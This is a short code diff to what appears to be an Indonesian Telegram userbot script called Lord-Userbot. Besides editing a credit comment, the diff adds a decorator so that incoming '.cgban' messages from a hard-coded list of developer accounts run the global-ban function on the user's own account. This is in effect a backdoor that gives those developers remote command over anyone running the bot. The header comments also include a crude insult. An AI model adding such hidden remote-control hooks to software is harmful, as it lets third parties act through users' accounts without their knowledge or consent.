@@ -1,4 +1,4 @@
-# Fixed By Koala @manusiarakitann
+# By Koala @manusiarakitann
 # jangan datang hanya saat perlu :) aku bukan tuhan
 # Lord-Userbot
 # Lu kontollll..
@@ -83,6 +83,7 @@ async def handler(tele):
 
 
 @register(outgoing=True, pattern="^.gban(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cgban(?: |$)(.*)")
 async def gben(userbot):
     dc = userbot
     sender = await dc.get_sender()
